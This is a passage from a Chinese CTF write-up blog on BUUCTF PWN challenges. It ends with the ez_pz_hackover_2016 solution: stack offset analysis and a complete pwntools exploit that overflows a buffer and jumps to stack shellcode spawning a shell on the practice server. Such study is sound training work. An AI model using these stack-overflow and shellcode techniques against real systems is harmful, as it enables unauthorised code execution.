此时在栈中的地址为 <kbd>0xffffd1e6</kbd>，而由 <kbd>chall()</kbd> 函数传入的字符串的地址为 <kbd>0xffffd220</kbd>。但是奇怪的是，该地址中存储的值为一个地址，即图中的 <kbd>0xffffd23c</kbd>，而该地址才是字符串 <kbd>crashme</kbd> 的真实地址，这一点我们可以直接查询栈空间数据来验证，如下图：</p><img src="0015.webp" alt="" style="zoom:75%"><p>所以这是本题的一个小陷阱，这并不是一个常规访问的字符数组，而需要通过首元素作为正式首地址来间接访问，数组起始地址与实际数据起始地址偏移为 <kbd>0x1C</kbd>。值得注意的是，那些多余的数据在 <kbd>memcpy()</kbd> 函数中均被完整复制了，因此最后 <kbd>dest</kbd> 中的数据如下图所示，与原数组完全一致。</p><img src="0016.webp" alt="" style="zoom:75%"><p>所以对于数据在栈中的偏移就有必要考虑上述问题的影响，首先影响的就是栈溢出的实现，因为此时数组实际数据距离栈底偏移为 <kbd>0x16</kbd>，因此栈溢出仅需填充这些数据并包含 <kbd>ebp</kbd> 位即可，该部分 <kbd>payload</kbd> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x16</span> - <span class="number">8</span> + <span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>关键的两段栈空间的偏移为 <kbd>0xffffd220</kbd> - <kbd>0xffffd1e6</kbd> = <kbd>0x3a</kbd>，而程序开头输出的地址如下图所示为实际地址。</p><img src="0016.webp" alt="" style="zoom:75%"><p>因此该地址减去 <kbd>0x3a</kbd> 后便到了新写入的真实数据的首地址，再加上 <kbd>payload</kbd> 在 <kbd>shellcode</kbd> 前所消耗的空间（共 <kbd>0x1e</kbd>），就可以锁定 <kbd>shellcode</kbd> 在栈中的地址了，该部分 <kbd>payload</kbd> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(stack_addr - <span class="number">0x3a</span> + <span class="number">0x1e</span>) + shellcode</span><br></pre></td></tr></table></figure></li><li><p>以上就是本题最难的部分了，对于程序打印出来的栈地址的读取以及 <kbd>shellcode</kbd> 的构造均放在如下完整 <kbd>exp</kbd> 中了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29039</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x16</span> - <span class="number">8</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(stack_addr - <span class="number">0x3a</span> + <span class="number">0x1e</span>) + shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="后记-2">后记</h2><p>  本篇博客作为 <kbd>PWN</kbd> 刷题的第二篇，预计字数一万以内，预计工期一星期以内，然而事实上……本篇博客作为 <kbd>PWN</kbd> 刷题的第二篇，实际字数近两万，实际工期近两周，综合消耗超过了第一篇刚入门时。</p><p>  其实在开始时，一切进展都非常顺利，除了第二题 <a href="#ciscn_2019_n_5">ciscn_2019_n_5</a> 耗费了些时间，笔者一度在周末杀到了 <a href="#jarvisoj_level3">jarvisoj_level3</a>，毕竟知识点都是在第一篇就学过的，所以字数与工期都在预定范围内。然而最后三篇准备一举刷完完结撒花时，却碰上了未曾涉猎过的<strong>堆</strong>与<strong>系统调用</strong>，又陷入了知识点的摸索，随之而来的便是字数飙升与工期延误。本篇最后一题 <a href="#ez_pz_hackover_2016">ez_pz_hackover_2016</a> 虽然并不难，但由于笔者前期拖延太久，因此解题时基本处于麻木状态。</p><p>  不过，事实上本篇博客工期内耗费时间最长的还是第二题 <a href="#ciscn_2019_n_5">ciscn_2019_n_5</a>，由于并没有在网络上找到相关问题的答案，因此笔者只能自行测试查资料，在配置了相当多的环境做实验以及各种扣现有资料的字眼才最终把问题指向 <strong>Linux 内核</strong>。当然，这纯属因个人好奇而探索，虽然占用了工期，却并没有帮助解题。</p><p>  最后呢，由衷感觉 <kbd>PWN</kbd> 的路还长，还是得安安心心继续学好一阵子。而后面的内容在网上能找到的资料也越来越少了，BUU 中的解出次数也从第一题的八千多到现在的七百多。<psw>也就是说啊，咱这成为优质博客的概率又大了。</psw></p></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>BUUCTF 刷题笔记——PWN 2</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://h-t-m.top/posts/72821c8/">https://h-t-m.top/posts/72821c8/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>h-t-m</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2022-10-24</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2022-11-05</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a></div><div class="post_share"><div class="social-share" data-image="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://npm.elemecdn.com/social-share.js/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://npm.elemecdn.com/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/aea4d4bd/"><img class="next-cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Crypto.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF 刷题笔记——Crypto 1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/9e217072/" title="BUUCTF 刷题笔记——PWN 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-22</div><div class="title">BUUCTF 刷题笔记——PWN 1</div></div></a></div><div><a href="/posts/3989fe45/" title="BUUCTF 刷题笔记——Basic 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-21</div><div class="title">BUUCTF 刷题笔记——Basic 1</div></div></a></div><div><a href="/posts/a080afff/" title="BUUCTF 刷题笔记——Basic 2"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-03</div><div class="title">BUUCTF 刷题笔记——Basic 2</div></div></a></div><div><a href="/posts/bf54f980/" title="BUUCTF 刷题笔记——Misc 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Misc.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-21</div><div class="title">BUUCTF 刷题笔记——Misc 1</div></div></a></div><div><a href="/posts/aea4d4bd/" title="BUUCTF 刷题笔记——Crypto 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Crypto.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-23</div><div class="title">BUUCTF 刷题笔记——Crypto 1</div></div></a></div><div><a href="/posts/ee33782f/" title="BUUCTF 刷题笔记——Reverse 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Reverse.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-19</div><div class="title">BUUCTF 刷题笔记——Reverse 1</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/logo.jpg" onerror='this.onerror=null,this.src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif"' alt="avatar"></div><div class="author-info__name">h-t-m</div><div class="author-info__description">个人博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">56</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h-t-m"><i class="fab fa-github"></i><span>找我玩~</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h-t-m/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1547563662@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://bu.dusays.com/2022/01/07/b3beff564d51a.png" target="_blank" title="微信"><i class="fab fa-weixin"></i></a><a class="social-icon" href="https://bu.dusays.com/2022/01/07/eaa1e2110d4a7.png" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客整体升级改造中</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">BUUCTF 刷题笔记——PWN 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#not-the-same-3dsctf-2016"><span class="toc-number">1.1.</span> <span class="toc-text">not_the_same_3dsctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-secret"><span class="toc-number">1.1.1.</span> <span class="toc-text">get_secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mprotect-2"><span class="toc-number">1.1.2.</span> <span class="toc-text">mprotect</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-5"><span class="toc-number">1.2.</span> <span class="toc-text">ciscn_2019_n_5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.2.1.</span> <span class="toc-text">ret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-BBS"><span class="toc-number">1.2.2.</span> <span class="toc-text">执行 BBS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#others-shellcode"><span class="toc-number">1.3.</span> <span class="toc-text">others_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-ne-5"><span class="toc-number">1.4.</span> <span class="toc-text">ciscn_2019_ne_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop"><span class="toc-number">1.5.</span> <span class="toc-text">铁人三项(第五赛区)_2018_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babyrop"><span class="toc-number">1.6.</span> <span class="toc-text">bjdctf_2020_babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babystack2"><span class="toc-number">1.7.</span> <span class="toc-text">bjdctf_2020_babystack2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-fm"><span class="toc-number">1.8.</span> <span class="toc-text">jarvisoj_fm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%86%99-payload-2"><span class="toc-number">1.8.1.</span> <span class="toc-text">手写 payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmtstr-payload-2"><span class="toc-number">1.8.2.</span> <span class="toc-text">fmtstr_payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2-sctf-2016"><span class="toc-number">1.9.</span> <span class="toc-text">pwn2_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-es-2"><span class="toc-number">1.10.</span> <span class="toc-text">ciscn_2019_es_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-tell-me-something"><span class="toc-number">1.11.</span> <span class="toc-text">jarvisoj_tell_me_something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-baby-rop2"><span class="toc-number">1.12.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level3"><span class="toc-number">1.13.</span> <span class="toc-text">jarvisoj_level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap-0ctf-2017"><span class="toc-number">1.14.</span> <span class="toc-text">babyheap_0ctf_2017</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-s-3"><span class="toc-number">1.15.</span> <span class="toc-text">ciscn_2019_s_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.15.1.</span> <span class="toc-text">ret2csu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SROP"><span class="toc-number">1.15.2.</span> <span class="toc-text">SROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-pz-hackover-2016"><span class="toc-number">1.16.</span> <span class="toc-text">ez_pz_hackover_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0-2"><span class="toc-number">1.17.</span> <span class="toc-text">后记</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/72821c8/" title="BUUCTF 刷题笔记——PWN 2"><img src="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——PWN 2"></a><div class="content"><a class="title" href="/posts/72821c8/" title="BUUCTF 刷题笔记——PWN 2">BUUCTF 刷题笔记——PWN 2</a><time datetime="2022-10-24T08:18:23.000Z" title="发表于 2022-10-24 16:18:23">2022-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/aea4d4bd/" title="BUUCTF 刷题笔记——Crypto 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Crypto.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——Crypto 1"></a><div class="content"><a class="title" href="/posts/aea4d4bd/" title="BUUCTF 刷题笔记——Crypto 1">BUUCTF 刷题笔记——Crypto 1</a><time datetime="2022-10-23T06:36:23.000Z" title="发表于 2022-10-23 14:36:23">2022-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/bf54f980/" title="BUUCTF 刷题笔记——Misc 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Misc.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——Misc 1"></a><div class="content"><a class="title" href="/posts/bf54f980/" title="BUUCTF 刷题笔记——Misc 1">BUUCTF 刷题笔记——Misc 1</a><time datetime="2022-10-21T12:16:53.000Z" title="发表于 2022-10-21 20:16:53">2022-10-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ee33782f/" title="BUUCTF 刷题笔记——Reverse 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Reverse.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——Reverse 1"></a><div class="content"><a class="title" href="/posts/ee33782f/" title="BUUCTF 刷题笔记——Reverse 1">BUUCTF 刷题笔记——Reverse 1</a><time datetime="2022-10-19T13:23:23.000Z" title="发表于 2022-10-19 21:23:23">2022-10-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/477423cc/" title="BUUCTF 刷题笔记——Web 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——Web 1"></a><div class="content"><a class="title" href="/posts/477423cc/" title="BUUCTF 刷题笔记——Web 1">BUUCTF 刷题笔记——Web 1</a><time datetime="2022-10-08T05:23:35.000Z" title="发表于 2022-10-08 13:23:35">2022-10-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright"><span>&copy;2020 - 2022<svg style="width:1.5em;height:1.5em" aria-hidden="true"><use xlink:href="#icon-Butterfly"></use></svg></span><span>h-t-m</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/instantpage.min.js" type="module"></script><script src="https://npm.elemecdn.com/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script async>var preloader={endLoading:()=>{document.body.style.overflow="auto",document.getElementById("loading-box").classList.add("loaded")},initLoading:()=>{document.body.style.overflow="",document.getElementById("loading-box").classList.remove("loaded")}};window.addEventListener("load",preloader.endLoading()),setTimeout((function(){preloader.endLoading()}),5e3)</script><div class="js-pjax"><link rel="stylesheet" href="https://npm.elemecdn.com/katex@latest/dist/katex.min.css"><script src="https://npm.elemecdn.com/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/katex@latest/dist/contrib/copy-tex.css"><script>document.querySelectorAll("#article-container span.katex-display").forEach((a=>{btf.wrap(a,"div",{class:"katex-wrap"})}))</script><script>document.getElementsByClassName("mermaid").length&&(window.mermaidJsLoad?mermaid.init():getScript("https://npm.elemecdn.com/mermaid/dist/mermaid.min.js").then((()=>{window.mermaidJsLoad=!0,mermaid.initialize({theme:"default"}),mermaid.init()})))</script><script>(()=>{const t=document.getElementById("twikoo-count"),e=()=>{twikoo.init(Object.assign({el:"#twikoo-wrap",envId:"https://twikoo-beta-seven.vercel.app/",region:""},null))},o=()=>{twikoo.getCommentsCount({envId:"https://twikoo-beta-seven.vercel.app/",region:"",urls:[window.location.pathname],includeReply:!1}).then((function(e){t.innerText=e[0].count})).catch((function(t){console.error(t)}))},n=(n=!1)=>{"object"==typeof twikoo?(e(),n&&t&&setTimeout(o,0)):getScript("https://npm.elemecdn.com/twikoo/dist/twikoo.all.min.js").then((()=>{e(),n&&t&&setTimeout(o,0)}))};btf.loadComment(document.getElementById("twikoo-wrap"),n)})()</script></div><div class="aplayer no-destroy" data-id="6751330199" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listfolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><script async src="/js/diytitle.js"></script><script async src="//at.alicdn.com/t/font_2987331_rwt2gum52cl.js"></script><script async src="//at.alicdn.com/t/font_3365955_q52nda6gxac.js"></script><script defer id="fluttering_ribbon" mobile="true" src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!0,POWERMODE.mobile=!1,document.body.addEventListener("input",POWERMODE)</script><script id="click-show-text" src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU,太毛" data-fontsize="15px" data-random="false" async></script><link rel="stylesheet" href="https://npm.elemecdn.com/aplayer/dist/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://npm.elemecdn.com/aplayer/dist/APlayer.min.js"></script><script src="/js/Meting.min.js"></script><script src="https://npm.elemecdn.com/pjax/pjax.min.js"></script><script>let pjaxSelectors=["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"]):not([href="/bb/"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!0,scrollRestoration:!1});document.addEventListener("pjax:send",(function(){if(window.removeEventListener("scroll",window.tocScrollFn),window.removeEventListener("scroll",scrollCollect),"object"==typeof preloader&&preloader.initLoading(),window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode")})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax]").forEach((e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach((e=>t.setAttribute(e.name,e.value))),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)})),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof chatBtnFn&&chatBtnFn(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","UA-214297516-1",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll(),"object"==typeof preloader&&preloader.endLoading()})),document.addEventListener("pjax:error",(e=>{404===e.request.status&&pjax.loadUrl("/404.html")}))</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="app-refresh" id="app-refresh" style="position:fixed;top:-2.2rem;left:0;right:0;z-index:99999;padding:0 1rem;font-size:15px;height:2.2rem;transition:all .3s ease"><div class="app-refresh-wrap" style="display:flex;color:#fff;height:100%;align-items:center;justify-content:center"><label>✨ h-t-m 更新了 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color:#fff;text-decoration:underline;cursor:pointer">👨‍💻立即刷新👌</span></a></div></div><script>function showNotification(){if(GLOBAL_CONFIG.Snackbar){var t="light"===document.documentElement.getAttribute("data-theme")?GLOBAL_CONFIG.Snackbar.bgLight:GLOBAL_CONFIG.Snackbar.bgDark,e=GLOBAL_CONFIG.Snackbar.position;Snackbar.show({text:"✨ h-t-m 更新了 👉",backgroundColor:t,duration:5e5,pos:e,actionText:"👨‍💻立即刷新👌",actionTextColor:"#fff",onActionClick:function(t){location.reload()}})}else{var o=`top: 0; background: ${"light"===document.documentElement.getAttribute("data-theme")?"#49b1f5":"#1f1f1f"};`;document.getElementById("app-refresh").style.cssText=o}}"serviceWorker"in navigator&&(navigator.serviceWorker.controller&&navigator.serviceWorker.addEventListener("controllerchange",(function(){showNotification()})),window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})))</script></div><script>var fdata={apiurl:"https://fcircle-h-t-m.vercel.app/api",initnumber:20,stepnumber:10,error_img:"https://cdn.jsdelivr.net/npm/akilar-candyassets/image/404.gif"};localStorage.setItem("fdatalist",JSON.stringify(fdata))</script><script defer src="https://cdn.jsdelivr.net/npm/hexo-filter-fcircle/assets/js/fetch.min.js"></script><script data-pjax>function butterfly_clock_injector_config(){var l=document.getElementsByClassName("sticky_layout")[0];console.log("已挂载butterfly_clock"),l.insertAdjacentHTML("afterbegin",'<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/images/~logo.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_clock_injector_config()</script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>function butterfly_footer_beautify_injector_config(){var t=document.getElementById("footer-wrap");console.log("已挂载butterfly_footer_beautify"),t.insertAdjacentHTML("beforeend",'<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src="https://pic.h-t-m.ltd/img/Frame-Hexo.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v3.8.2" title=""><img src="https://pic.h-t-m.ltd/img/Theme-Butterfly.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站默认线路托管于Vercel" title=""><img src="https://pic.h-t-m.ltd/img/Hosted-Vercel.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Gtihub托管" title=""><img src="https://pic.h-t-m.ltd/img/Source-Github.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referral" style="margin-inline:5px" data-title="本网站由又拍云提供 CDN 加速 / 云储存服务" title=""><img src="https://pic.h-t-m.ltd/img/upyun.svg" alt=""/></a><a class="github-badge" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42011502001415" style="margin-inline:5px" data-title="本站已完成公安备案，备案号鄂公网安备 42011502001415号" title=""><img src="https://pic.h-t-m.ltd/img/police-beian.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" style="margin-inline:5px" data-title="本站已在工信部备案，备案号赣ICP备2021010131号-2" title=""><img src="https://pic.h-t-m.ltd/img/beian.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20220223" style="margin-inline:5px" data-title="本站已在萌国备案，备案号萌ICP备20220223号" title=""><img src="https://pic.h-t-m.ltd/img/moe-beian.svg" alt=""/></a></p>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_footer_beautify_injector_config()</script><script async src="/js/runtime.js"></script><script async src="//at.alicdn.com/t/font_3365955_q52nda6gxac.js"></script></body></html>